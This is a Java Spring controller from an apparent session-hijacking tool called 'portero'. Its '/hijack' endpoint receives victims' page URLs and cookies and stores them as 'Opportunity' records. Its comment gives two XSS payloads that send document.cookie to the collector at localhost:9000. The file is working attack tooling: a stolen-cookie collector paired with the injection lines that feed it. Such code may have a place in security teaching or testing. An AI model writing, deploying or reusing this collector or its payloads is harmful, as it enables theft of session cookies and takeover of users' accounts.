package portero.web.controllers;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import portero.dao.OpportunityRepository;
import portero.domain.Opportunity;

import java.time.LocalDateTime;

import static java.lang.String.format;

@Controller
public class HijackController {

    private static Log log = LogFactory.getLog(HijackController.class);

    @Autowired
    OpportunityRepository repository;

    /**
     * Call from a XSS vulnerability using one of the following techniques.
     * - document.write("<img src='http://localhost:9000/hijack?url=" + encodeURIComponent(window.location.href) + "&cookies=" + encodeURIComponent(document.cookie) + "' />");
     * - document.createElement("img").src="http://localhost:9000/hijack?url=" + encodeURIComponent(window.location.href) + "&cookies=" + encodeURIComponent(document.cookie)
     */
    @RequestMapping("/hijack")
    @ResponseBody
    public void hijack(@RequestParam(value="url", required=false) String url,
                         @RequestParam(value="cookies", required=false) String cookies, Model model) {
        if(log.isDebugEnabled()) {
            log.debug(format("url=%s cookies=%s", url, cookies));
        }

        Opportunity opportunity = new Opportunity();
        opportunity.setUrl(url);
        opportunity.setCookies(cookies);
        opportunity.setActive(true);
        opportunity.setCreatedDateTime(LocalDateTime.now());
        repository.save(opportunity);
    }
}